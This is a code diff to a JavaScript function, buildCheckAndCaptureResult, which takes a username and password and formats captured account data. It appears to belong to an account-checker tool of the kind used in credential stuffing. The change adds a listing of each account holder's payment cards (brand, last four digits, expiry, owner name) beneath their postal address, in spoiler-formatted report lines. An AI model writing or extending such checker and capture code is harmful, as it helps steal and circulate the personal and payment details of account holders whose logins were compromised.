@@ -214,11 +214,30 @@ function buildCheckAndCaptureResult(result, capture, username, durationMs, passw
       }
       
       // Address
-      if (p.postalCode || p.state || p.city) {
+      const hasAddress = p.postalCode || p.state || p.city;
+      const hasCards = p.cards && p.cards.length > 0;
+      
+      if (hasAddress) {
         const addr = [p.postalCode, p.state, p.city, p.addressLine1].filter(Boolean).join(' ');
-        parts.push(`└ Address: ${spoilerCodeV2(addr)}`);
-      } else {
-        // Remove trailing ├ and replace with └
+        parts.push(`${hasCards ? '├' : '└'} Address: ${spoilerCodeV2(addr)}`);
+      }
+      
+      // Cards section
+      if (hasCards) {
+        p.cards.forEach((card, idx) => {
+          const isLast = idx === p.cards.length - 1;
+          const prefix = isLast ? '└' : '├';
+          // Format: VISA •••• 1044 (05/27) 川崎泰子
+          const cardInfo = [
+            card.brand || '???',
+            `••••${card.last4 || '????'}`,
+            card.expiry ? `(${card.expiry})` : '',
+            card.owner || '',
+          ].filter(Boolean).join(' ');
+          parts.push(`${prefix} 💳 ${spoilerCodeV2(cardInfo)}`);
+        });
+      } else if (!hasAddress) {
+        // If no address and no cards, fix last item prefix
         const lastIdx = parts.length - 1;
         if (parts[lastIdx].startsWith('├')) {
           parts[lastIdx] = parts[lastIdx].replace('├', '└');
